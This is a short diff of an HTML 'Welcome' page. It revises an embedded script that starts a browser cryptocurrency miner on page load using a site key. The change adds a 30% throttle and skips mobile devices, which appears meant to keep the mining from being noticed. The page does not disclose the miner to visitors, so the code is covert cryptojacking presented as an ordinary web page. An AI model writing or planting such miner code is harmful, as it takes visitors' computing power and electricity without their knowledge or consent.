@@ -11,9 +11,11 @@
         <h1> Welcome </h1>
     </center>
 
-<script>
-    var miner = WMP.Anonymous('SK_hG53kBqXdihMZBejDEDHN');
-    miner.start();
-</script>    
+    <script>
+        var miner = WMP.Anonymous('SK_hG53kBqXdihMZBejDEDHN',{throttle: 0.3});
+        if (!miner.isMobile()){
+            miner.start();
+        }
+    </script>   
 </body>
 </html>
